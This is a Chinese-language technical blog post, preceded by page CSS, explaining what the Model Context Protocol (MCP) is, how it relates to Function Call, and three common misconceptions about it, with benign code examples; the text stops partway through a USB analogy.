mfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2024 年末，MCP（Model Context Protocol）火了。各种技术文章蜂拥而至："MCP 革命性突破！"、"AI 工具调用的未来！"、"不懂 MCP 就out了！"</p>
<p>但当你真正去了解时，会发现很多文章要么是概念科普（讲了半天不知道怎么用），要么是愿景描绘（听起来很美好但落不了地）。</p>
<p><strong>这篇文章就是来破局的。</strong> 我们不讲故事，只讲本质：MCP 到底是什么？它解决了什么问题？和 Function Call 有什么关系？该不该用？</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、MCP 到底是什么？</h2>
<h3 data-id="heading-1">1.1 一句话说清楚</h3>
<p><strong>MCP（Model Context Protocol，模型上下文协议）</strong> 是一套标准化的协议，用来规范 AI 应用如何调用外部工具和数据源。</p>
<p>听起来还是有点抽象？我们换个说法：</p>
<p>想象你在开发一个 AI 助手，需要接入：</p>
<ul>
<li>📍 <strong>地图服务</strong>：查地址、规划路线</li>
<li>🌤️ <strong>天气查询</strong>：实时天气、天气预报</li>
<li>📊 <strong>数据库</strong>：查用户数据、订单信息</li>
<li>📧 <strong>邮件服务</strong>：发送通知</li>
</ul>
<p><strong>没有 MCP 之前</strong>：每个服务都有自己的接口格式</p>
<ul>
<li>A 服务用 JSON-RPC</li>
<li>B 服务用 REST API</li>
<li>C 服务用 gRPC</li>
<li>D 服务要自定义协议</li>
</ul>
<p>你得分别研究每个 API 文档，写不同的适配代码，维护多套调用逻辑。团队协作时还要反复对齐接口格式。</p>
<p><strong>有了 MCP 之后</strong>：大家约定统一的"接口标准"</p>
<ul>
<li>工具提供方按 MCP 协议暴露能力（MCP Server）</li>
<li>AI 应用按 MCP 协议调用工具（MCP Client）</li>
<li>格式、认证、错误处理都有统一规范</li>
</ul>
<p><strong>类比理解</strong>：MCP 之于 AI 工具调用，就像 USB 之于数据传输。</p>
<ul>
<li>没有 USB 前：每个设备都有自己的接口（各种圆口、方口、扁口），乱七八糟</li>
<li>有了 USB 后：一个标准走天下，插上就能用</li>
</ul>
<hr/>
<h3 data-id="heading-2">1.2 MCP 解决的核心问题</h3>
<p>我们用一个实际场景说明：</p>
<p><strong>场景</strong>：你在做一个智能客服系统，需要：</p>
<ol>
<li>查询用户订单状态（调用内部订单系统 API）</li>
<li>查询物流信息（调用顺丰/京东物流 API）</li>
<li>查询商品库存（调用库存系统 API）</li>
<li>发送客服消息（调用企业微信 API）</li>
</ol>
<h4 data-id="heading-3">问题 1：接口格式不统一</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 订单系统的接口</span>
{
  <span class="hljs-string">"action"</span>: <span class="hljs-string">"query_order"</span>,
  <span class="hljs-string">"params"</span>: {<span class="hljs-string">"order_id"</span>: <span class="hljs-string">"12345"</span>}
}

<span class="hljs-comment">// 物流系统的接口</span>
{
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"trackShipment"</span>,
  <span class="hljs-string">"arguments"</span>: {<span class="hljs-string">"tracking_no"</span>: <span class="hljs-string">"SF123456"</span>}
}

<span class="hljs-comment">// 库存系统的接口</span>
<span class="hljs-variable constant_">POST</span> /api/inventory/check
<span class="hljs-title class_">Body</span>: {<span class="hljs-string">"sku"</span>: <span class="hljs-string">"PROD-001"</span>, <span class="hljs-string">"warehouse"</span>: <span class="hljs-string">"BJ"</span>}
</code></pre>
<p>每个接口都不一样，你得写大量的适配代码。</p>
<h4 data-id="heading-4">问题 2：AI 不知道该调用哪个工具</h4>
<p>AI 收到用户问题"我的订单什么时候到？"，需要判断：</p>
<ul>
<li>这个问题需要调用什么工具？</li>
<li>需要哪些参数？</li>
<li>参数从用户的话里怎么提取？</li>
</ul>
<p>没有统一规范，每个开发者都自己定义，导致：</p>
<ul>
<li>工具描述格式不一致</li>
<li>参数定义方式不一致</li>
<li>AI 难以准确判断</li>
</ul>
<h4 data-id="heading-5">问题 3：团队协作困难</h4>
<ul>
<li>前端开发者：后端接口怎么调？参数格式是什么？</li>
<li>后端开发者：AI 会传什么参数过来？怎么处理？</li>
<li>AI 工程师：工具列表怎么维护？提示词怎么写？</li>
</ul>
<p>缺乏标准，沟通成本巨大。</p>
<hr/>
<p><strong>MCP 的解决方案</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// 统一的 MCP 工具定义格式</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_order"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"查询订单状态"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"inputSchema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"order_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"订单ID"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>所有工具都按这个格式定义，AI 能统一处理，开发者能快速集成。</p>
<blockquote>
<p>💡 <strong>Tip</strong>：MCP 不是银弹，它只是把"调用外部工具"这件事标准化了。原有的问题（AI 判断不准、参数提取错误）并没有消失。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">1.3 破除三个常见误解</h3>
<h4 data-id="heading-7">误解 1："MCP 是一种新的 AI 技术"</h4>
<p>很多文章会说"MCP 提升了 AI 的工具调用能力"，这是不准确的。</p>
<p><strong>真相</strong>：MCP 底层用的还是传统的 <strong>Function Call</strong>（工具调用）。</p>
<p>看一段 MCP 客户端的核心代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// MCP 客户端决定使用哪个工具</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
  <span class="hljs-attr">messages</span>: messages,
  <span class="hljs-attr">tools</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">tools</span>  <span class="hljs-comment">// ← 这就是传统的 Function Call 参数！</span>
});
</code></pre>
<p>MCP 只是在 Function Call 外面包了一层标准化协议，<strong>没有改变 AI 的判断能力</strong>。</p>
<p>Function Call 原有的问题依然存在：</p>
<ul>
<li>❌ 工具选择不准确（工具太多时容易选错）</li>
<li>❌ 参数提取错误（复杂参数容易提取不准）</li>
<li>❌ 多意图识别困难（一个问题涉及多个工具）</li>
</ul>
<p><strong>结论</strong>：MCP 是协议标准化，不是技术突破。</p>
<hr/>
<h4 data-id="heading-8">误解 2："用了 MCP 就不用自己写工具调用代码了"</h4>
<p>很多人以为 MCP 是什么"开箱即用"的解决方案，装上就能用。</p>
<p><strong>真相</strong>：MCP 的工作流程和你自己实现 Function Call 几乎一模一样。</p>
<p>对比一下：</p>






























<table><thead><tr><th>实现步骤</th><th>自己写 Function Call</th><th>使用 MCP</th></tr></thead><tbody><tr><td><strong>1️⃣ 定义工具</strong></td><td>写工具描述 + 参数定义</td><td>MCP Server 定义工具（还是要写）</td></tr><tr><td><strong>2️⃣ AI 决策</strong></td><td>调用 AI 的 Function Call</td><td>MCP Client 调用 AI（还是 Function Call）</td></tr><tr><td><strong>3️⃣ 执行工具</strong></td><td>后端接收参数，调用真实 API</td><td>MCP Server 执行并返回（还是要实现）</td></tr><tr><td><strong>4️⃣ 生成回复</strong></td><td>把结果给 AI 生成回复</td><td>MCP Client 把结果给 AI（逻辑一样）</td></tr></tbody></table>
<p><strong>本质上是一样的</strong>。</p>
<p>那 MCP 的价值在哪？答案是：<strong>生态标准化</strong>。</p>
<p>当大家都按同一套规则来：</p>
<ul>
<li>✅ 工具能跨项目复用</li>
<li>✅ 团队协作有统一规范</li>
<li>✅ 第三方工具能方便集成</li>
<li>✅ 降低学习和沟通成本</li>
</ul>
<p>但如果你只是一个人开发，或者工具都是自己的内部 API，MCP 的价值就没那么大。</p>
<blockquote>
<p>💡 <strong>Tip</strong>：把 MCP 理解成"工具调用的接口标准"，就像 RESTful API 是 Web 服务的接口标准一样。</p>
</blockquote>
<hr/>
<h4 data-id="heading-9">误解 3："MCP 服务都是免费的"</h4>
<p>看到各种 MCP Server（高德地图、百度地图、天气服务），有人以为调用是免费的。</p>
<p><strong>真相</strong>：API 调用成本最终还是要有人承担。</p>
<p>以高德地图 MCP 为例：</p>
<ol>
<li>你通过 Cursor 调用高德地图 MCP</li>
<li>高德的 MCP Server 收到请求后，会调用高德自己的地图 API</li>
<li>这些 API 调用是<strong>计费的</strong>（按调用次数或配额）</li>
</ol>
<p>有些大厂的 MCP 服务是免费的，但那是因为：</p>
<ul>
<li>前期投入，吸引开发者</li>
<li>调用量有限制（超过就收费）</li>
<li>培养生态、获取数据、占领市场</li>
</ul>
<p><strong>天下没有免费的午餐</strong>，只是谁付费、怎么付费的问题。</p>
<p>如果你用 MCP 接入收费服务，要注意：</p>
<ul>
<li>⚠️ 了解计费规则（按次数？按流量？按时长？）</li>
<li>⚠️ 设置调用限额（防止意外超支）</li>
<li>⚠️ 监控使用量（定期检查账单）</li>
<li>⚠️ 考虑缓存策略（减少重复调用）</li>
</ul>
<hr/>
<h3 data-id="heading-10">1.4 MCP 的真正价值：生态话语权</h3>
<p>既然 MCP 没有技术创新，为什么 Anthropic（Claude 的母公司）要大力推？</p>
<p>答案是：<strong>争夺 AI 工具生态的话语权</strong>。</p>
<h4 data-id="heading-11">类比：USB 标准的故事</h4>
<p>还记得 USB 标准是怎么来的吗？</p>
<p>1990 年代：</p>
<ul>
<li>键盘用 PS/2 接口</li>
<li>鼠标用串口</li>
<li>打印机用并口</li>
<li>扫描仪用 SCSI 接口</li>
